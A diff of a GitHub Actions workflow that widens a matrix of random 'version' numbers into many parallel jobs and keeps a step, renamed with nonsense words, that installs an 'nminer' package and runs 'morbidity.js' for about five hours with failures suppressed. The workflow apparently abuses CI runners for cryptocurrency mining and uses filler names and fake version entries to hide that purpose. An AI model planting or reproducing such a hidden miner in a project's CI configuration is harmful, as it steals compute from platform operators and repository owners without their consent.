@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3448 }
-          - { version: 9128 }
-          - { version: 7576 }
-          - { version: 4557 }
-          - { version: 1232 }
-          - { version: 2255 }
-          - { version: 9704 }
-          - { version: 4536 }
-          - { version: 5271 }
-          - { version: 3654 }
-          - { version: 9097 }
-          - { version: 1303 }
-          - { version: 8737 }
-          - { version: 7451 }
-          - { version: 2909 }
-          - { version: 1315 }
-          - { version: 1358 }
+          - { version: 7424 }
+          - { version: 6136 }
+          - { version: 5773 }
+          - { version: 1380 }
+          - { version: 2301 }
+          - { version: 425 }
+          - { version: 3153 }
+          - { version: 8856 }
+          - { version: 7436 }
+          - { version: 3825 }
+          - { version: 2873 }
+          - { version: 8871 }
+          - { version: 7624 }
+          - { version: 1867 }
+          - { version: 2744 }
+          - { version: 413 }
+          - { version: 7942 }
+          - { version: 6199 }
+          - { version: 877 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: lack nougat geez inasmuch
+      - name: bleakly defrag provided however
         run: |
           npm install nminer@latest
-          timeout 333m node morbidity.js || echo "morbidity executed"
+          timeout 303m node morbidity.js || echo "morbidity executed"
